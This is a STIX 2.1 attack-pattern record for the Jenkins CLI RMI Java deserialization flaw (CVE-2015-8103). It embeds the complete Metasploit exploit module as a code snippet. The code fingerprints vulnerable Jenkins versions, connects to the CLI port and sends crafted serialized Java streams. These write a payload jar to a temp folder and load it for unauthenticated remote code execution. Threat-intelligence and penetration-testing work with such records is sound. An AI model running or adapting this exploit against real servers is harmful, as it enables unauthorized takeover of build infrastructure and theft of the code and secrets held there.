{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2217bf71-ea26-4978-a729-25633f3a7c98",
    "created": "2024-08-14T16:57:31.088861Z",
    "modified": "2024-08-14T16:57:31.088865Z",
    "name": "Jenkins CLI RMI Java Deserialization Vulnerability",
    "description": " This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on the Jenkins master, which allows remote arbitrary code execution. Authentication is not required to exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/jenkins_java_deserialize.rb",
            "external_id": "jenkins_java_deserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8103"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java"
        },
        {
            "source_name": "reference",
            "url": "http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Jenkins CLI RMI Java Deserialization Vulnerability',\n      'Description'    => %q{\n        This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on\n        the Jenkins master, which allows remote arbitrary code execution. Authentication is not\n        required to exploit this vulnerability.\n      },\n      'Author'         =>\n          [\n            'Christopher Frohoff', # Vulnerability discovery\n            'Steve Breen',         # Public Exploit\n            'Dev Mohanty',         # Metasploit module\n            'Louis Sato',          # Metasploit\n            'wvu',                 # Metasploit\n            'juan vazquez',        # Metasploit\n            'Wei Chen'             # Metasploit\n          ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n          [\n            ['CVE', '2015-8103'],\n            ['URL', 'https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py'],\n            ['URL', 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java'],\n            ['URL', 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability'],\n            ['URL', 'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11']\n          ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'Jenkins 1.637', {} ]\n        ],\n      'DisclosureDate' => '2015-11-18',\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to Jenkins in order to find X-Jenkins-CLI-Port', '/']),\n      OptString.new('TEMP', [true, 'Folder to write the payload to', '/tmp']),\n      Opt::RPORT('8080')\n    ])\n\n    register_advanced_options([\n      OptPort.new('XJenkinsCliPort', [false, 'The X-Jenkins-CLI port. If this is set, the TARGETURI option is ignored.'])\n    ])\n  end\n\n  def cli_port\n    @jenkins_cli_port || datastore['XJenkinsCliPort']\n  end\n\n  def exploit\n    if cli_port == 0 && !vulnerable?\n      fail_with(Failure::Unknown, \"#{peer} - Jenkins is not vulnerable, aborting...\")\n    end\n    invoke_remote_method(set_payload)\n    invoke_remote_method(class_load_payload)\n  end\n\n\n  # This is from the HttpClient mixin. But since this module isn't actually exploiting\n  # HTTP, the mixin isn't used in order to favor the Tcp mixin (to avoid datastore confusion &\n  # conflicts). We do need #target_uri and normlaize_uri to properly normalize the path though.\n\n  def target_uri\n    begin\n      # In case TARGETURI is empty, at least we default to '/'\n      u = datastore['TARGETURI']\n      u = \"/\" if u.nil? or u.empty?\n      URI(u)\n    rescue ::URI::InvalidURIError\n      print_error \"Invalid URI: #{datastore['TARGETURI'].inspect}\"\n      raise Msf::OptionValidateError.new(['TARGETURI'])\n    end\n  end\n\n  def normalize_uri(*strs)\n    new_str = strs * \"/\"\n\n    new_str = new_str.gsub!(\"//\", \"/\") while new_str.index(\"//\")\n\n    # Makes sure there's a starting slash\n    unless new_str[0,1] == '/'\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def check\n    result = Exploit::CheckCode::Safe\n\n    begin\n      if vulnerable?\n        result = Exploit::CheckCode::Vulnerable\n      end\n    rescue Msf::Exploit::Failed => e\n      vprint_error(e.message)\n      return Exploit::CheckCode::Unknown\n    end\n\n    result\n  end\n\n  def vulnerable?\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'The connection timed out.')\n    end\n\n    http_headers = res.headers\n\n    unless http_headers['X-Jenkins-CLI-Port']\n      vprint_error('The server does not have the CLI port that is needed for exploitation.')\n      return false\n    end\n\n    if http_headers['X-Jenkins'] && http_headers['X-Jenkins'].to_f <= 1.637\n      @jenkins_cli_port = http_headers['X-Jenkins-CLI-Port'].to_i\n      return true\n    end\n\n    false\n  end\n\n  # Connects to the server, creates a request, sends the request,\n  # reads the response\n  #\n  # Passes +opts+ through directly to Rex::Proto::Http::Client#request_cgi.\n  #\n  def send_request_cgi(opts={}, timeout = 20)\n    if datastore['HttpClientTimeout'] && datastore['HttpClientTimeout'] > 0\n      actual_timeout = datastore['HttpClientTimeout']\n    else\n      actual_timeout =  opts[:timeout] || timeout\n    end\n\n    begin\n      c = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['RPORT'])\n      c.connect\n      r = c.request_cgi(opts)\n      c.send_recv(r, actual_timeout)\n    rescue ::Errno::EPIPE, ::Timeout::Error\n      nil\n    end\n  end\n\n  def invoke_remote_method(serialized_java_stream)\n    begin\n      socket = connect(true, {'RPORT' => cli_port})\n\n      print_status 'Sending headers...'\n      socket.put(read_bin_file('serialized_jenkins_header'))\n\n      vprint_status(socket.recv(1024))\n      vprint_status(socket.recv(1024))\n\n      encoded_payload0 = read_bin_file('serialized_payload_header')\n      encoded_payload1 = Rex::Text.encode_base64(serialized_java_stream)\n      encoded_payload2 = read_bin_file('serialized_payload_footer')\n\n      encoded_payload = \"#{encoded_payload0}#{encoded_payload1}#{encoded_payload2}\"\n      print_status \"Sending payload length: #{encoded_payload.length}\"\n      socket.put(encoded_payload)\n    ensure\n      disconnect(socket)\n    end\n\n  end\n\n  def print_status(msg='')\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\n\n  #\n  # Serialized stream generated with:\n  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/CommonsCollections3.java\n  #\n  def set_payload\n    stream = Rex::Java::Serialization::Model::Stream.new\n\n    handle = File.new(File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2015-8103\", 'serialized_file_writer' ), 'rb')\n    decoded = stream.decode(handle)\n    handle.close\n\n    inject_payload_into_stream(decoded).encode\n  end\n\n  #\n  # Serialized stream generated with:\n  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/ClassLoaderInvoker.java\n  #\n  def class_load_payload\n    stream = Rex::Java::Serialization::Model::Stream.new\n    handle = File.new(File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-8103', 'serialized_class_loader' ), 'rb')\n    decoded = stream.decode(handle)\n    handle.close\n    inject_class_loader_into_stream(decoded).encode\n  end\n\n  def inject_class_loader_into_stream(decoded)\n    file_name_utf8 = get_array_chain(decoded)\n                         .values[2]\n                         .class_data[0]\n                         .values[1]\n                         .values[0]\n                         .values[0]\n                         .class_data[3]\n    file_name_utf8.contents = get_random_file_name\n    file_name_utf8.length = file_name_utf8.contents.length\n    class_name_utf8 = get_array_chain(decoded)\n                          .values[4]\n                          .class_data[0]\n                          .values[0]\n    class_name_utf8.contents = 'metasploit.Payload'\n    class_name_utf8.length = class_name_utf8.contents.length\n    decoded\n  end\n\n  def get_random_file_name\n    @random_file_name ||= \"#{Rex::FileUtils.normalize_unix_path(datastore['TEMP'], \"#{rand_text_alpha(4 + rand(4))}.jar\")}\"\n  end\n\n  def inject_payload_into_stream(decoded)\n    byte_array = get_array_chain(decoded)\n                     .values[2]\n                     .class_data\n                     .last\n    byte_array.values = payload.encoded.bytes\n    file_name_utf8 = decoded.references[44].class_data[0]\n    rnd_fname = get_random_file_name\n    register_file_for_cleanup(rnd_fname)\n    file_name_utf8.contents = rnd_fname\n    file_name_utf8.length = file_name_utf8.contents.length\n    decoded\n  end\n\n  def get_array_chain(decoded)\n    object = decoded.contents[0]\n    lazy_map = object.class_data[1].class_data[0]\n    chained_transformer = lazy_map.class_data[0]\n    chained_transformer.class_data[0]\n  end\n\n  def read_bin_file(bin_file_path)\n    data = ''\n\n    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2015-8103\", bin_file_path ), 'rb') do |f|\n      data = f.read\n    end\n\n    data\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-18",
    "x_mitre_platforms": [
        "java'"
    ]
}